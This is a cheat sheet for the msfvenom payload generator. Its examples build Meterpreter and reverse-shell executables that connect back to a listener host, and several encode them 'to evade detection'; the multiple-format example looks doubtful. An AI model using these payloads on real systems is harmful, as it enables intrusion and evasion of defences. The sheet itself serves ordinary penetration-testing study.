`msfvenom` is a command-line utility within the Metasploit Framework used for generating and encoding payloads. It replaces `msfpayload` and `msfencode` and allows users to create custom payloads for various exploits.

### **msfvenom Commands and Options**

1. **Basic Payload Generation**

   - **Description:** Generate a payload with specified parameters.
   - **Command:**
     ```bash
     msfvenom -p <payload> [options]
     ```
   - **Example:**
     ```bash
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o /tmp/evil.exe
     ```
   - **Explanation:** Generates a Windows Meterpreter reverse TCP payload with the specified LHOST and LPORT, outputting it as an executable file.

2. **List Available Payloads**

   - **Description:** List all available payloads in msfvenom.
   - **Command:**
     ```bash
     msfvenom -l payloads
     ```
   - **Example:**
     ```bash
     msfvenom -l payloads | grep windows
     ```
   - **Explanation:** Lists all payloads related to Windows.

3. **Encoding Payloads**

   - **Description:** Encode a payload to evade detection.
   - **Command:**
     ```bash
     msfvenom -p <payload> [options] -e <encoder> -i <iterations>
     ```
   - **Example:**
     ```bash
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o /tmp/encoded.exe
     ```
   - **Explanation:** Encodes the payload using the `x86/shikata_ga_nai` encoder with 3 iterations, outputting it as an executable.

4. **Payload Options**

   - **Description:** Display options for a specific payload.
   - **Command:**
     ```bash
     msfvenom -p <payload> --list-options
     ```
   - **Example:**
     ```bash
     msfvenom -p windows/meterpreter/reverse_tcp --list-options
     ```
   - **Explanation:** Lists the configuration options available for the specified payload.

5. **Generate Payloads with a Specific Format**

   - **Description:** Generate a payload and specify the output format.
   - **Command:**
     ```bash
     msfvenom -p <payload> [options] -f <format> -o <output_file>
     ```
   - **Example:**
     ```bash
     msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o /tmp/reverse_shell.elf
     ```
   - **Explanation:** Generates a Linux reverse shell payload in ELF format.

6. **Generate Payloads with Multiple Formats**

   - **Description:** Generate a payload and output it in multiple formats.
   - **Command:**
     ```bash
     msfvenom -p <payload> [options] -f <format1> -f <format2> -o <output_file>
     ```
   - **Example:**
     ```bash
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -f asp -o /tmp/payload
     ```
   - **Explanation:** Generates a payload and saves it in both EXE and ASP formats.

7. **Custom Payload Generation**

   - **Description:** Generate a custom payload with specific parameters.
   - **Command:**
     ```bash
     msfvenom -p <payload> [options] -a <architecture> -b <badchars> --platform <platform> -f <format>
     ```
   - **Example:**
     ```bash
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -a x86 --platform Windows -b "\x00\x0a" -f exe -o /tmp/custom_payload.exe
     ```
   - **Explanation:** Creates a Windows Meterpreter reverse TCP payload, avoiding bad characters `\x00` and `\x0a`.

8. **Generate Payload with a Specific Payload Size**

   - **Description:** Specify the payload size for the output.
   - **Command:**
     ```bash
     msfvenom -p <payload> [options] -e <encoder> -i <iterations> -b <badchars> --payload-size <size> -f <format>
     ```
   - **Example:**
     ```bash
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 3 -b "\x00" --payload-size 200 -f exe -o /tmp/payload_with_size.exe
     ```
   - **Explanation:** Generates a payload with a size of 200 bytes, encoded to evade detection.

### **Summary of msfvenom Commands**

| **Option**                     | **Command Example**                                                       | **Description**                                  |
|--------------------------------|---------------------------------------------------------------------------|--------------------------------------------------|
| Basic Payload Generation       | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o /tmp/evil.exe` | Generate a basic payload                        |
| List Available Payloads        | `msfvenom -l payloads`                                                      | List all available payloads                      |
| Encoding Payloads              | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o /tmp/encoded.exe` | Encode a payload to evade detection             |
| Payload Options                | `msfvenom -p windows/meterpreter/reverse_tcp --list-options`                 | Display options for a specific payload          |
| Generate Payloads with Format  | `msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o /tmp/reverse_shell.elf` | Generate a payload with a specific format       |
| Generate Payloads with Multiple Formats | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -f asp -o /tmp/payload` | Generate payloads in multiple formats           |
| Custom Payload Generation      | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -a x86 --platform Windows -b "\x00\x0a" -f exe -o /tmp/custom_payload.exe` | Create custom payloads with specific parameters |
| Generate Payload with Size     | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 3 -b "\x00" --payload-size 200 -f exe -o /tmp/payload_with_size.exe` | Specify payload size                            |

`msfvenom` is a powerful tool for generating and customizing payloads, which can be used for various penetration testing and exploitation purposes.